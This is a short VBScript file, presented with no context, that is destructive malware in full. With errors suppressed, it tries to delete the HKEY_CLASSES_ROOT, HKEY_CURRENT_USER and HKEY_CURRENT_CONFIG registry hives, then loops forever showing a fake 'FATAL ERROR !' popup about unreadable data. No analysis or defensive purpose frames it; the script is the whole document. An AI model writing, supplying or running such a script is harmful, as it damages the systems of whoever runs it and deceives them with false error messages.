on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regdelete "HKEY_CLASSES_ROOT" 
s.regdelete "HKEY_CURRENT_USER" 
s.regdelete "HKEY_CURRENT_CONFIG" 
i=1
while i>0 or i<0
S.popup "FATAL ERROR !",0, "data cant read",0+16
i=i-1
wend


